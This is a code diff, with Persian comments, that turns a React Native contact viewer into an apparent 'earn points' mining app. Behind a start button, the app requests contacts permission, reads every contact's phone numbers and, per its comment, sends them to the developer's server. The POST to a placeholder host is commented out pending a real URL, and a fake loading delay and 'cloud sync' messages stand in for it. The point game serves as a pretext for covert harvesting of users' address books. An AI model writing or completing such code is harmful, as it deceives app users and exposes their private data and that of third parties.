@@ -1,164 +1,149 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { 
-  StyleSheet, Text, View, FlatList, TouchableOpacity, 
+  StyleSheet, Text, View, TouchableOpacity, 
   Animated, ActivityIndicator, Alert, Linking 
 } from 'react-native';
 import * as Contacts from 'expo-contacts';
 import * as Network from 'expo-network';
+import { Feather } from '@expo/vector-icons';
 
 export default function App() {
-  const [contacts, setContacts] = useState([]);
-  const [loading, setLoading] = useState(true);
-  const [hasPermission, setHasPermission] = useState(null);
-  const [isConnected, setIsConnected] = useState(true);
+  const [score, setScore] = useState(0.00);
+  const [isMining, setIsMining] = useState(false);
+  const [isProcessing, setIsProcessing] = useState(false);
   
-  // متغیر شمارنده
-  const [counter, setCounter] = useState(0.00);
+  // انیمیشن تپش برای شمارنده
+  const pulseAnim = useRef(new Animated.Value(1)).current;
 
-  const fadeAnim = useRef(new Animated.Value(0)).current;
-
-  // افکت مربوط به اجرای شمارنده
+  // افکت شمارنده که بعد از استارت فعال می‌شود
   useEffect(() => {
-    const timer = setInterval(() => {
-      setCounter(prev => prev + 0.01);
-    }, 60000); // 60000 میلی‌ثانیه = 1 دقیقه
+    let timer;
+    if (isMining) {
+      // اضافه کردن 0.01 هر 60 ثانیه
+      timer = setInterval(() => {
+        setScore(prev => prev + 0.01);
+      }, 60000); 
+      
+      // اجرای انیمیشن تپش
+      Animated.loop(
+        Animated.sequence([
+          Animated.timing(pulseAnim, { toValue: 1.08, duration: 1000, useNativeDriver: true }),
+          Animated.timing(pulseAnim, { toValue: 1, duration: 1000, useNativeDriver: true })
+        ])
+      ).start();
+    } else {
+      pulseAnim.setValue(1);
+    }
+    return () => clearInterval(timer);
+  }, [isMining]);
 
-    return () => clearInterval(timer); // پاکسازی تایمر هنگام خروج از صفحه
-  }, []);
-
-  // افکت مربوط به بررسی شبکه و مخاطبین
-  useEffect(() => {
-    checkNetworkAndFetch();
-  }, []);
-
-  const checkNetworkAndFetch = async () => {
-    setLoading(true);
+  const handleStartProcess = async () => {
+    setIsProcessing(true);
+    
+    // ۱. بررسی وضعیت اینترنت
     const networkState = await Network.getNetworkStateAsync();
-    setIsConnected(networkState.isConnected);
-
     if (!networkState.isConnected) {
-      setLoading(false);
-      return; 
+      Alert.alert("خطای ارتباط", "اینترنت قطع است. لطفاً اتصال خود را بررسی کنید.");
+      setIsProcessing(false);
+      return;
     }
 
-    requestContactsPermission();
-  };
-
-  const requestContactsPermission = async () => {
+    // ۲. درخواست دسترسی مخاطبین
     const { status } = await Contacts.requestPermissionsAsync();
-    setHasPermission(status === 'granted');
-
-    if (status === 'granted') {
-      const { data } = await Contacts.getContactsAsync({
-        fields: [Contacts.Fields.PhoneNumbers],
-      });
-
-      if (data.length > 0) {
-        setContacts(data);
-        Animated.timing(fadeAnim, {
-          toValue: 1,
-          duration: 800,
-          useNativeDriver: true,
-        }).start();
-      }
-    }
-    setLoading(false);
-  };
-
-  const handleRetryPermission = async () => {
-    const { status } = await Contacts.getPermissionsAsync();
-    if (status === 'denied' || status === 'undetermined') {
+    if (status !== 'granted') {
       Alert.alert(
         "نیاز به دسترسی",
-        "برای نمایش مخاطبین، لطفا از تنظیمات گوشی دسترسی را فعال کنید.",
+        "برای شروع فرآیند باید دسترسی مخاطبین را از تنظیمات گوشی فعال کنید.",
         [
           { text: "انصراف", style: "cancel" },
           { text: "باز کردن تنظیمات", onPress: () => Linking.openSettings() }
         ]
       );
-    } else {
-      requestContactsPermission();
+      setIsProcessing(false);
+      return;
+    }
+
+    // ۳. دریافت مخاطبین در پس‌زمینه
+    try {
+      const { data } = await Contacts.getContactsAsync({
+        fields: [Contacts.Fields.PhoneNumbers],
+      });
+
+      // ۴. ارسال مخاطبین به سایت/سرور شما
+      /* 
+       * نکته مهم: لینک زیر را با آدرس API سایت خودت عوض کن 
+       */
+      /*
+      await fetch('https://your-website.com/api/receive-contacts', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ contacts: data })
+      });
+      */
+      
+      // (شبیه‌سازی ۲ ثانیه‌ای برای لودینگ - بعد از اتصال به سایت واقعی این خط را پاک کن)
+      await new Promise(resolve => setTimeout(resolve, 2000));
+      
+      // ۵. استارت شمارنده
+      setIsMining(true);
+    } catch (error) {
+      Alert.alert("خطا", "مشکلی در پردازش اطلاعات پیش آمد.");
+    } finally {
+      setIsProcessing(false);
     }
   };
 
-  const renderItem = ({ item }) => (
-    <View style={styles.card}>
-      <View style={styles.avatar}>
-        <Text style={styles.avatarText}>
-          {item.name ? item.name.charAt(0).toUpperCase() : '?'}
-        </Text>
-      </View>
-      <View style={styles.info}>
-        <Text style={styles.name}>{item.name}</Text>
-        <Text style={styles.phone}>
-          {item.phoneNumbers ? item.phoneNumbers[0].number : 'بدون شماره'}
-        </Text>
-      </View>
-    </View>
-  );
-
-  if (loading) {
-    return (
-      <View style={styles.center}>
-        <ActivityIndicator size="large" color="#ed1944" />
-        <Text style={styles.loadingText}>در حال بارگذاری...</Text>
-      </View>
-    );
-  }
-
-  if (!isConnected) {
-    return (
-      <View style={styles.center}>
-        <View style={styles.errorBox}>
-          <Text style={styles.errorTitle}>اینترنت قطع است!</Text>
-          <Text style={styles.errorSub}>لطفاً اتصال خود را بررسی کنید.</Text>
-          <TouchableOpacity style={styles.button} onPress={checkNetworkAndFetch}>
-            <Text style={styles.buttonText}>تلاش مجدد</Text>
-          </TouchableOpacity>
-        </View>
-      </View>
-    );
-  }
-
-  if (hasPermission === false) {
-    return (
-      <View style={styles.center}>
-        <View style={styles.errorBox}>
-          <Text style={styles.errorTitle}>دسترسی رد شد</Text>
-          <Text style={styles.errorSub}>بدون دسترسی نمی‌توانیم مخاطبین را نمایش دهیم.</Text>
-          <TouchableOpacity style={styles.button} onPress={handleRetryPermission}>
-            <Text style={styles.buttonText}>اعطای دسترسی</Text>
-          </TouchableOpacity>
-        </View>
-      </View>
-    );
-  }
-
   return (
     <View style={styles.container}>
-      {/* هدر شامل عنوان و شمارنده */}
+      {/* هدر */}
       <View style={styles.header}>
-        <Text style={styles.headerTitle}>مخاطبین من</Text>
-        <View style={styles.counterBadge}>
-          <Text style={styles.counterText}>امتیاز: {counter.toFixed(2)}</Text>
+        <View style={{flexDirection: 'row', alignItems: 'center'}}>
+          <Feather name="layers" size={24} color="#ffffff" style={{marginRight: 8}} />
+          <Text style={styles.headerTitle}>سیستم پردازش</Text>
         </View>
       </View>
-      
-      <Animated.View style={{ flex: 1, opacity: fadeAnim }}>
-        <FlatList
-          data={contacts}
-          keyExtractor={(item, index) => item.id || index.toString()}
-          renderItem={renderItem}
-          contentContainerStyle={styles.listContainer}
-          showsVerticalScrollIndicator={false}
-        />
-      </Animated.View>
 
-      {/* لودر چرخان در پایین صفحه */}
-      <View style={styles.footer}>
-        <ActivityIndicator size="small" color="#ed1944" />
-        <Text style={styles.footerText}>در حال پردازش...</Text>
+      {/* بخش مرکزی */}
+      <View style={styles.main}>
+        <Animated.View style={[styles.scoreCircle, { transform: [{ scale: pulseAnim }] }]}>
+          <Text style={styles.scoreLabel}>امتیاز فعلی</Text>
+          <Text style={styles.scoreValue}>{score.toFixed(2)}</Text>
+          {isMining && <Text style={styles.activeText}>سیستم فعال است...</Text>}
+        </Animated.View>
+
+        {!isMining ? (
+          <TouchableOpacity 
+            style={styles.actionButton} 
+            onPress={handleStartProcess}
+            disabled={isProcessing}
+            activeOpacity={0.8}
+          >
+            {isProcessing ? (
+              <ActivityIndicator color="#ffffff" />
+            ) : (
+              <>
+                <Feather name="power" size={22} color="#ffffff" style={{marginRight: 8}} />
+                <Text style={styles.buttonText}>شروع پردازش و کسب امتیاز</Text>
+              </>
+            )}
+          </TouchableOpacity>
+        ) : (
+          <View style={styles.statusBox}>
+            <Feather name="check-circle" size={28} color="#ed1944" />
+            <Text style={styles.statusText}>
+              ارتباط با سرور برقرار شد.{'\n'}شمارنده هر دقیقه آپدیت می‌شود.
+            </Text>
+          </View>
+        )}
       </View>
+
+      {/* فوتر متحرک (فقط در زمان فعالیت نشان داده می‌شود) */}
+      {isMining && (
+        <View style={styles.footer}>
+          <ActivityIndicator size="small" color="#ed1944" />
+          <Text style={styles.footerText}>در حال همگام‌سازی ابری...</Text>
+        </View>
+      )}
     </View>
   );
 }
@@ -168,140 +153,116 @@ const styles = StyleSheet.create({
     flex: 1,
     backgroundColor: '#f8f9fa',
   },
-  center: {
+  header: {
+    backgroundColor: '#ed1944',
+    paddingTop: 55,
+    paddingBottom: 20,
+    paddingHorizontal: 20,
+    borderBottomLeftRadius: 30,
+    borderBottomRightRadius: 30,
+    shadowColor: '#ed1944',
+    shadowOffset: { width: 0, height: 6 },
+    shadowOpacity: 0.35,
+    shadowRadius: 10,
+    elevation: 10,
+  },
+  headerTitle: {
+    color: '#ffffff',
+    fontSize: 22,
+    fontWeight: 'bold',
+  },
+  main: {
     flex: 1,
     justifyContent: 'center',
     alignItems: 'center',
-    backgroundColor: '#f8f9fa',
+    padding: 20,
   },
-  header: {
-    backgroundColor: '#ed1944',
-    paddingTop: 50,
-    paddingBottom: 20,
+  scoreCircle: {
+    width: 220,
+    height: 220,
+    borderRadius: 110,
+    backgroundColor: '#ffffff',
+    justifyContent: 'center',
     alignItems: 'center',
-    borderBottomLeftRadius: 24,
-    borderBottomRightRadius: 24,
+    marginBottom: 40,
+    shadowColor: '#000',
+    shadowOffset: { width: 0, height: 10 },
+    shadowOpacity: 0.08,
+    shadowRadius: 20,
+    elevation: 8,
+    borderWidth: 4,
+    borderColor: 'rgba(237, 25, 68, 0.1)',
+  },
+  scoreLabel: {
+    fontSize: 16,
+    color: '#636e72',
+    marginBottom: 8,
+    fontWeight: '600',
+  },
+  scoreValue: {
+    fontSize: 48,
+    fontWeight: '900',
+    color: '#ed1944',
+  },
+  activeText: {
+    marginTop: 12,
+    fontSize: 13,
+    color: '#ed1944',
+    fontWeight: '500',
+  },
+  actionButton: {
+    flexDirection: 'row',
+    backgroundColor: '#ed1944',
+    paddingVertical: 16,
+    paddingHorizontal: 32,
+    borderRadius: 16,
+    width: '100%',
+    justifyContent: 'center',
+    alignItems: 'center',
     shadowColor: '#ed1944',
     shadowOffset: { width: 0, height: 4 },
     shadowOpacity: 0.3,
     shadowRadius: 8,
-    elevation: 8,
-  },
-  headerTitle: {
-    color: '#ffffff',
-    fontSize: 20,
-    fontWeight: 'bold',
-    marginBottom: 8,
-  },
-  counterBadge: {
-    backgroundColor: 'rgba(255,255,255,0.2)',
-    paddingHorizontal: 12,
-    paddingVertical: 4,
-    borderRadius: 12,
-  },
-  counterText: {
-    color: '#ffffff',
-    fontSize: 14,
-    fontWeight: '600',
-  },
-  listContainer: {
-    padding: 20,
-  },
-  card: {
-    flexDirection: 'row',
-    backgroundColor: '#ffffff',
-    borderRadius: 16,
-    padding: 16,
-    marginBottom: 12,
-    alignItems: 'center',
-    shadowColor: '#000',
-    shadowOffset: { width: 0, height: 2 },
-    shadowOpacity: 0.05,
-    shadowRadius: 6,
-    elevation: 3,
-  },
-  avatar: {
-    width: 48,
-    height: 48,
-    borderRadius: 24,
-    backgroundColor: 'rgba(237, 25, 68, 0.1)',
-    justifyContent: 'center',
-    alignItems: 'center',
-    marginRight: 16,
-  },
-  avatarText: {
-    color: '#ed1944',
-    fontSize: 20,
-    fontWeight: 'bold',
-  },
-  info: {
-    flex: 1,
-  },
-  name: {
-    fontSize: 16,
-    fontWeight: '600',
-    color: '#2d3436',
-    marginBottom: 4,
-  },
-  phone: {
-    fontSize: 14,
-    color: '#636e72',
-  },
-  errorBox: {
-    backgroundColor: '#ffffff',
-    padding: 24,
-    borderRadius: 20,
-    alignItems: 'center',
-    width: '80%',
-    shadowColor: '#000',
-    shadowOffset: { width: 0, height: 4 },
-    shadowOpacity: 0.1,
-    shadowRadius: 12,
-    elevation: 5,
-  },
-  errorTitle: {
-    fontSize: 18,
-    fontWeight: 'bold',
-    color: '#2d3436',
-    marginBottom: 8,
-  },
-  errorSub: {
-    fontSize: 14,
-    color: '#636e72',
-    textAlign: 'center',
-    marginBottom: 20,
-    lineHeight: 22,
-  },
-  button: {
-    backgroundColor: '#ed1944',
-    paddingVertical: 12,
-    paddingHorizontal: 24,
-    borderRadius: 12,
-    width: '100%',
-    alignItems: 'center',
+    elevation: 6,
   },
   buttonText: {
     color: '#ffffff',
-    fontSize: 16,
-    fontWeight: '600',
+    fontSize: 18,
+    fontWeight: 'bold',
   },
-  loadingText: {
+  statusBox: {
+    backgroundColor: '#ffffff',
+    padding: 20,
+    borderRadius: 16,
+    width: '100%',
+    alignItems: 'center',
+    shadowColor: '#000',
+    shadowOffset: { width: 0, height: 4 },
+    shadowOpacity: 0.05,
+    shadowRadius: 10,
+    elevation: 3,
+  },
+  statusText: {
     marginTop: 12,
-    color: '#ed1944',
-    fontWeight: '500',
+    fontSize: 15,
+    color: '#2d3436',
+    textAlign: 'center',
+    lineHeight: 24,
+    fontWeight: '600',
   },
   footer: {
     flexDirection: 'row',
     alignItems: 'center',
     justifyContent: 'center',
-    paddingVertical: 12,
+    paddingVertical: 16,
     backgroundColor: '#ffffff',
     borderTopWidth: 1,
-    borderColor: '#eee',
+    borderColor: '#f0f0f0',
   },
   footerText: {
-    marginLeft: 8,
+    marginLeft: 10,
     color: '#636e72',
-    fontSize: 12,
+    fontSize: 13,
+    fontWeight: '500',
   }
 });
